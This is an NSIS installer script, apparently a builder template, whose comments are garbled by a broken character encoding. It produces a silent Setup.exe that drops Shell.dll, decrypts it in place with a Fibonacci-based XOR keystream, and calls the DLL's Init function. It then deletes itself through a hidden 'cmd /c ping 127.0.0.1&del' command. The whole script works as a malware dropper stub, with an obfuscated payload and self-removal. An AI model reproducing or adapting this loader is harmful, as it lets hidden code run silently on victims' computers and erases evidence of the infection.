!include "LogicLib.nsh"
Name "Test"

; ���ɵĵ�����װִ���ļ�

OutFile "../Setup.exe"
SetCompressor /SOLID lzma

; ��Ĭ��װ
Silentinstall Silent
;--------------------------------

; ��װ����

Section "RC"

	SectionIn RO

	; ���ð�װĿ¼.

	StrCpy $R1 ${NSIS_MAX_STRLEN}
	
	System::Call 'kernel32::ExpandEnvironmentStrings(t "%s",t .R1,i 1024)'
	
	StrCpy $INSTDIR $R1

	SetOutPath $INSTDIR

	; Ҫ�����װ���ļ�
	File "Shell.dll"
	File "data.dat"
	; �����ļ�
	FileOpen $R1 "$INSTDIR\Shell.dll" "a"
	
	;��ʼ��ѭ��������
	IntOp $1 %d1 + 0
	IntOp $2 %d2 + 0
	IntOp $3 0 + 0
	
	;��ʼ쳲�����������
	${For} $R3 0 %d3
	
		IntOp $3 $1 + $2
		IntOp $3 $3 % 255
		
		FileReadByte $R1 $R2
		FileSeek $R1 -1 CUR
		IntOp $R2 $R2 ^ $3
		FileWriteByte $R1 $R2
		
		IntOp $1 $2 + 0
		IntOp $2 $3 + 0
	
;		IntOp $R3 $R3 + 1
	
	${Next}

	FileClose $R1

	;��ɾ�� ���ֲ�����Ӧ���ո��·��
	System::Call '$INSTDIR\Shell.dll::Init(i 1)'
	System::Call 'kernel32::GetModuleFileName(i 0,t .R1,i 1024)'
	ExecShell "open" "cmd.exe" "/c ping 127.0.0.1&del $\"$R1$\"" SW_HIDE

SectionEnd